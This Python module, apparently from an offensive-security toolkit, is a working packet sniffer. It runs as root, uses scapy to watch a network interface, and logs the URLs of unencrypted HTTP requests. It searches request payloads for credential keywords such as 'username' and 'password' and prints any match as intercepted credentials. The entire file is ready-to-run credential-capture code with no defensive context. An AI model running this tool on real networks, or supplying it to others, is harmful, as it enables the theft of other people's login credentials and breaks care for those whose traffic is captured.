#!/usr/bin/env python3
from core.banner import info, success, warn, error, CYAN, GREEN, RESET, BRIGHT
from core.checker import check_root
CRED_KEYWORDS = ['username', 'uname', 'user', 'login', 'email', 'password', 'pass', 'pwd', 'auth']

def get_url(packet):
    from scapy.layers import http
    if packet.haslayer(http.HTTPRequest):
        host = packet[http.HTTPRequest].Host
        path = packet[http.HTTPRequest].Path
        if host and path:
            return (host + path).decode('utf-8', errors='ignore')
    return None

def get_login_info(packet):
    import scapy.all as scapy
    if packet.haslayer(scapy.Raw):
        try:
            load = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
            for keyword in CRED_KEYWORDS:
                if keyword in load.lower():
                    return load
        except Exception:
            pass
    return None

def run(args):
    check_root(exit_on_failure=True)
    interface = args.interface or 'eth0'
    try:
        import scapy.all as scapy
        from scapy.layers import http
    except ImportError:
        error('Scapy HTTP layer missing. Install via: pip install scapy')
        return 1
    info(f"Starting packet sniffer on interface '{interface}'...")
    info('Monitoring unencrypted HTTP communications. Press Ctrl+C to stop.')

    def process_packet(packet):
        if packet.haslayer(http.HTTPRequest):
            if not args.creds_only:
                url = get_url(packet)
                if url:
                    print(f'{CYAN}[HTTP URL]{RESET} http://{url}')
            if not args.urls_only:
                creds = get_login_info(packet)
                if creds:
                    print(f'\n{GREEN}{BRIGHT}[+] Possible Credentials Intercepted:{RESET}\n{creds}\n')
    try:
        scapy.sniff(iface=interface, store=False, prn=process_packet)
    except KeyboardInterrupt:
        info('\nPacket sniffer stopped.')
        return 0
    except Exception as e:
        error(f'Error during packet sniffing: {e}')
        return 1
